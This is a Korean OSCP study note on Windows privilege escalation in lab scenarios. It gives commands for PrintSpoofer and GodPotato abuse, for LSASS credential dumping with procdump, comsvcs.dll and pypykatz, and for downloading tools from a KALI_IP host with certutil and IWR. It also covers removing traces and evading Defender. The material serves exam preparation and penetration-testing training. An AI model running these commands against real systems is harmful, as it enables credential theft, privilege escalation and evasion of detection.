# 종합 실습 시나리오 + 도구 운용 (OSCP 기준)

# 시나리오

- 시나리오 A: 웹쉘(IIS AppPool) → `whoami /priv`에서 SeImpersonatePrivilege 발견
  - `PrintSpoofer64.exe -i -c "whoami"` → SYSTEM 확인
  - 플래그 수집
- 시나리오 B: MSSQL `xp_cmdshell` (mssqlserver 계정) → SeImpersonatePrivilege 발견
  - `GodPotato-NET4.exe -cmd "cmd /c whoami"` → SYSTEM 확인
- 시나리오 C: 로컬 관리자 쉘 → SeDebugPrivilege 발견
  - `procdump -ma lsass.exe` → Kali에서 `pypykatz`로 자격 증명 추출
  - 같은 패스워드 재사용 여부 확인 후 측면 이동

# 도구 준비 체크리스트

- `PrintSpoofer64.exe` / `PrintSpoofer32.exe`
- `GodPotato-NET4.exe`
- `SweetPotato.exe`
- `JuicyPotato.exe` + OS별 CLSID 목록
- `procdump.exe` (Sysinternals)
- `mimikatz.exe` 또는 Kali의 `pypykatz`
- `nc.exe` 또는 PowerShell 리버스쉘 원라이너

# 도구 운용 방식 (OSCP 기준)

- 설치가 아니다. 타겟에 인스톨러를 돌리는 게 아니라 Kali에서 준비한 단일 exe를 업로드해서 실행만 한다
- 타겟은 보통 인터넷이 안 되므로 Kali를 http 서버로 열어 전송한다
  - Kali: `python3 -m http.server 8000`
  - 타겟: `certutil -urlcache -split -f http://KALI_IP:8000/PrintSpoofer64.exe C:\temp\ps.exe`
  - 타겟: `IWR http://KALI_IP:8000/GodPotato-NET4.exe -OutFile C:\temp\gp.exe`
- 실행 위치는 쓰기 가능한 임시 폴더만 쓴다
  - `C:\temp`, `C:\Windows\Temp`, `C:\Users\Public`
  - 현재 사용자 Temp 확인: `echo $env:TEMP`
- 사용 후 흔적 제거는 기본이다
  - `Remove-Item C:\temp\ps.exe, C:\temp\gp.exe -Force`
- mimikatz는 타겟에서 직접 돌리지 말고 덤프만 빼온다
  - 이유: 백신(Defender)에 즉시 탐지/삭제된다
  - 정석: 타겟에서 `procdump -ma lsass.exe` → dmp만 Kali로 가져오기 → Kali에서 `pypykatz`로 분석
- exe 업로드가 막히면 파일 없는(Living-off-the-land) 방법을 쓴다
  - LSASS 덤프: `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full`
  - 리버스쉘: `nc.exe` 대신 PowerShell 원라이너 (파일 전송 불필요)
  - SAM/SYSTEM: `reg save`는 윈도우 내장 명령이라 전송 불필요
